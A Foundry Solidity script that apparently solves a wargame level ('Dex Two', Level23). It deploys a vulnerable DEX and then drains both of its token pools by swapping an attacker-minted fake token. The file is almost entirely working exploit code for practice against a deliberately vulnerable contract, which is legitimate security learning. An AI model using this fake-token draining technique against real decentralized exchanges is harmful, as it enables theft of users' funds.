pragma solidity ^0.8.14;

import {Script, console} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {DexTwo, SwappableTokenTwo} from "../src/Level23.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

contract Level23Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress);
        vm.stopBroadcast();

        require(levelDone(contractAddress), "Solution failed");
    }

    function exploit(address _target) private {
        SwappableTokenTwo fakeToken = new SwappableTokenTwo(_target, "T1", "T1", 1 ether);

        DexTwo dex = DexTwo(_target);
        IERC20 t1 = IERC20(dex.token1());
        IERC20 t2 = IERC20(dex.token2());

        uint256 balance1 = t1.balanceOf(_target);
        uint256 balance2 = t2.balanceOf(_target);

        fakeToken.approve(_target, type(uint256).max);
        fakeToken.transfer(_target, 1);
        dex.swap(address(fakeToken), address(t1), 1);
        dex.swap(address(fakeToken), address(t2), 2);
    }

    function levelDone(address _target) private returns (bool) {
        DexTwo target = DexTwo(_target);
        uint256 balance1 = IERC20(target.token1()).balanceOf(_target);
        uint256 balance2 = IERC20(target.token2()).balanceOf(_target);
        return balance1 == 0 && balance2 == 0;
    }
}

contract Setup is Script {
    function run() public {
        VmSafe.Wallet memory attacker = vm.createWallet(vm.envUint("PRIVATE_KEY"));
        VmSafe.Wallet memory deployer = vm.createWallet(vm.envUint("PRIVATE_KEY_2"));
        vm.startBroadcast(deployer.privateKey);

        DexTwo target = new DexTwo();
        address token1 = address(new SwappableTokenTwo(address(target), "T1", "T1", 110));
        address token2 = address(new SwappableTokenTwo(address(target), "T2", "T2", 110));
        IERC20(token1).transfer(attacker.addr, 10);
        IERC20(token2).transfer(attacker.addr, 10);

        IERC20(token1).approve(address(target), 100);
        IERC20(token2).approve(address(target), 100);
        target.add_liquidity(token1, 100);
        target.add_liquidity(token2, 100);
        target.setTokens(token1, token2);

        vm.stopBroadcast();

        console.log("Target address:", address(target));
    }
}
